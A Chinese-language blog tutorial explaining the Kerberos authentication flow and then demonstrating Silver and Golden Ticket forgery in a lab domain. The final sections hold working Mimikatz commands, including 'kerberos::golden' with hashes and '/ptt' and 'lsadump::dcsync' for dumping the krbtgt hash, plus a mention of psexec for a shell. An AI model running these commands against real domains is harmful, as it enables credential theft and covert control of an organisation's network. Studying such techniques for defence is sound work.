---
title: "Kerberos 协议到票据伪造"
slug: kerberos-protocol-to-ticket-forgery
aliases: ["/2020/kerberos-protocol-to-ticket-forgery.html"]
date: 2020-08-25 12:50:05
categories: ["网络安全"]
tags: ["Windows", "域", "Ticket", "白银票据", "黄金票据", "Kerberos"]
toc: true
draft: false
---

目前域环境中使用的认证协议基本都是 `Kerberos` ，所以把 `Kerberos` 协议理解透彻对域渗透来说极其重要。

![UsgRjNOfKrpAWPk](https://oss.zjun.info/zjun.info/UsgRjNOfKrpAWPk.webp)

图片来自：

<http://web.mit.edu/kerberos/>

## 0x01 Kerberos 协议简化描述

上面的图片就是 `Kerberos` 的 `logo` ，形象为三个狗头，正好符合 `Kerberos` 协议中的 `三个` 主要角色：

* Client = 访问服务的客户端
* Server = 提供服务的服务端
* Key Distribution Center（KDC）= 密钥分发中心 = Domain Controller（DC）

其中 `KDC` 又包含以下两部分：

* Authentication Server（AS）= 认证服务
* Ticket Granting Server（TGS）= 票据授权服务

![7UptSByn4RarV8b](https://oss.zjun.info/zjun.info/7UptSByn4RarV8b.webp)

`Kerberos` 协议简要描述如下：

1. 客户端发送自己的用户名到`KDC`服务器以向`AS`服务进行认证。

2. `KDC`服务器会生成相应的`TGT`(`Ticket Granting Ticket`) 票据，打上时间戳，在本地数据库中查找该用户的密码，并用该密码对`TGT`进行加密，将结果发还给客户端。

3. 客户端收到该信息，使用自己的密码进行解密之后，得到`TGT`票据。这个`TGT`会在一段时间之后失效，也有一些会话管理器 (`session manager`) 能在用户登陆期间进行自动更新。

4. 当客户端需要使用一些特定服务的时候，客户端就发送`TGT`到`KDC`服务器中的`TGS`服务。

5. 当该用户的`TGT`验证通过并且其有权访问所申请的服务时，`TGS`服务会生成一个该服务所对应的票据 (`ticket`) 和会话密钥 (`session key`)，并发还给客户端。

6. 客户端将服务请求与该`ticket`一并发送给相应的服务端即可。

## 0x02 Kerberos 协议具体流程

### 用户登陆

**用户使用客户端上的程序进行登陆**。

用户需要在客户端上输入用户 `ID` 与密码，客户端程序运行一个单向函数 ( `One-way function` ) 把密码转换成密钥，这个就是客户端 ( `Client` ) 的用户密钥 ( `user's secret key` )。

### 客户端认证

**客户端 ( `Client` ) 从认证服务器 ( `AS` ) 获取票据授权票据 `Ticket Granting Ticket` 简称 `TGT` 。**

1. 客户端向`AS`发送一条明文信息，用以申请对某服务的访问。

   但是这里用户不向 `AS` 发送用户密钥 ( `user's secret key` )，也不发送密码，该 `AS` 能够从本地数据库中查询到该申请用户的密码，并通过与客户端相同的途径转换成相同的用户密钥 ( `user's secret key` )。

2. `AS`检查该用户`ID`是否存在于本地数据库中，如果存在则返回两条信息：

   * `Client/TGS` 会话密钥 ( `Client/TGS Session Key` )，该 `Session Key` 用在将来 `Client` 与 `TGS` 的通信上，并通过用户密钥 ( `user's secret key` ) 进行加密。

   * 票据授权票据 ( `TGT` )， `TGT` 包括： `Client/TGS 会话密钥` ，用户 `ID` ，用户网址， `TGT` 有效期，并通过 `TGS` 密钥 ( `TGS's secret key` ) 进行加密。

3. 当`Client`收到上一步的两条消息后，`Client`首先尝试用自己的用户密钥 (`user's secret key`) 解密`Client/TGS 会话密钥`，如果用户输入的密码与`AS`数据库中的密码不符，则不能成功解密。输入正确的密码并通过随之生成的`user's secret key`才能解密，从而得到`Client/TGS 会话密钥`。

### 服务授权

**`Client` 从 `TGS` 获取票据 ( `client-to-server ticket` )**

1. 当`Client`需要申请特定服务时，会向`TGS`发送以下两条消息：

   * `AS` 向 `Client` 返回的票据授权票据 `TGT` ，以及需要获取服务的服务 `ID` 。
   * 认证符 ( `Authenticator` )，其包括：用户 `ID` ，时间戳，并通过 `Client/TGS 会话密钥` 进行加密。

2. 收到以上两条消息后，`TGS`首先检查`KDC`数据库中是否存在所需的服务，查找到之后，`TGS`用自己的 TGS 密钥 (`TGS's secret key`) 解密`TGT`，从而得到之前生成的`Client/TGS 会话密钥`。`TGS`再用这个会话密钥解密得到包含用户`ID`和时间戳的`Authenticator`，并对`TGT`和`Authenticator`进行验证，验证通过之后返回两条消息：
   * `Client-Server` 票据 ( `client-to-server ticket` )，该票据包括： `Client/SS` 会话密钥 ( `Client/Server Session Key` ），用户 `ID` ，用户网址，有效期），并通过提供该服务的服务器密钥 ( `service's secret key` ) 进行加密。
   * `Client/SS` 会话密钥 ( `Client/Server Session Key` )，该会话密钥用在将来 `Client` 与 `Server Service` 的通信上，并通过 `Client/TGS` 会话密钥 ( `Client/TGS Session Key` ) 进行加密。
3. `Client`收到这些消息后，用`Client/TGS`会话密钥 (`Client/TGS Session Key`) 解密得到`Client/SS`会话密钥 (`Client/Server Session Key`)。

### 服务请求

**`Client` 从 `Server` 获取服务**

1. 当获得`Client/SS`会话密钥 (`Client/Server Session Key`) 之后，`Client`就能够使用服务器提供的服务了。`Client`向指定服务器`Server`发出两条消息：
   * 上一步的 `Client-Server` 票据 ( `client-to-server ticket` )，并通过服务器密钥 ( `service's secret key` ) 进行加密。
   * 新的 `Authenticator` 包括：用户 `ID` ，时间戳，并通过 `Client/SS` 会话密钥 ( `Client/Server Session Key` ) 进行加密。
2. `Server`用自己的密钥`service's secret key`解密`Client-Server`票据得到`TGS`提供的`Client/SS`会话密钥`Client/Server Session Key`。再用这个会话密钥解密得到新的`Authenticator`，再对`Ticket`和`Authenticator`进行验证，验证通过则返回一条消息：
   * 新时间戳，新时间戳是： `Client` 发送的时间戳加 `1` ( `Kerberos` 版本 `5` 已经取消这一做法），并通过 `Client/SS` 会话密钥 ( `Client/Server Session Key` ) 进行加密。
3. `Client`通过`Client/SS`会话密钥 (`Client/Server Session Key`) 解密得到`新时间戳`并验证其是否正确。验证通过的话则客户端可以信赖服务器，并向服务器`Server`发送服务请求。
4. 服务器`Server`向客户端`Client`提供相应的服务。

![3](https://oss.zjun.info/zjun.info/3.webp)

## 0x03 白银票据 Silver Ticket 伪造

白银票据伪造的是 `TGS` 的票据，是一个点对点的有效凭证。

正常情况下一个非域管权限的域内用户访问域控的文件共享是拒绝访问的。

![uFHzxmCnGAbjM7J](https://oss.zjun.info/zjun.info/uFHzxmCnGAbjM7J.webp)

下面来伪造白银票据来让 `Client` 端的该用户具有访问权限：

* 得到域控管理员`NTLM Hash`：`ec9c6ab085b32841da1a0c61466b959b`

![4](https://oss.zjun.info/zjun.info/4.webp)

  得到域 `SID` ： `S-1-5-21-3446166583-1116429469-1279190574`

![5](https://oss.zjun.info/zjun.info/5.webp)

* 当前域名是`zjun.com`，伪造的用户名为`test`，服务伪造`cifs`，需要访问的主机是`dc.zjun.com`，在`Client`利用`Mimikatz`执行

```bahs
  kerberos::golden /domain:zjun.com /sid:S-1-5-21-3446166583-1116429469-1279190574 /target:dc.zjun.com /rc4:ec9c6ab085b32841da1a0c61466b959b /service:cifs /user:test /ptt

  /domain: 域名称
  /sid: 域 SID
  /target: 目标主机名
  /service: 服务类型
  /rc4: 用户 NTLM hash
  /user: 伪造的随意用户名
  ```

![6](https://oss.zjun.info/zjun.info/6.webp)

  可以看到内存中已经有了票据

![7](https://oss.zjun.info/zjun.info/7.webp)

现在也有了权限访问 `DC` 的文件共享了

![8](https://oss.zjun.info/zjun.info/8.webp)

也可以利用 `psexec` 弹回 `cmd`

![9](https://oss.zjun.info/zjun.info/9.webp)

## 0x04 黄金票据 Golden Ticket 伪造

黄金票据伪造的是 `TGT` ，是一个任意服务的认证凭据。

伪造黄金票据最主要得是需要获得 `krbtgt` 用户的 `NTLM hash` ，在拿下域控后可以抓取 `kerbtgt` 的 `NTLM hash` ：

```bash
mimikatz.exe log "lsadump::dcsync /domain:zjun.com /user:krbtgt" exit
```

![10](https://oss.zjun.info/zjun.info/10.webp)

然后便可容易在域内其他主机或可以访问到域的主机上伪造黄金票据：

```bash
kerberos::golden /admin:administrator /domain:zjun.com /sid:S-1-5-21-3446166583-1116429469-1279190574 /krbtgt:66ad458513450343d7625cd1bc6f7262 /ptt

/admin：伪造的任意用户名
/domain：域名称
/sid：域 SID
/krbtgt：krbtgt 用户的 NTLM hash
```

![11](https://oss.zjun.info/zjun.info/11.webp)

可以很隐蔽的控制整个域环境。

![12](https://oss.zjun.info/zjun.info/12.webp)
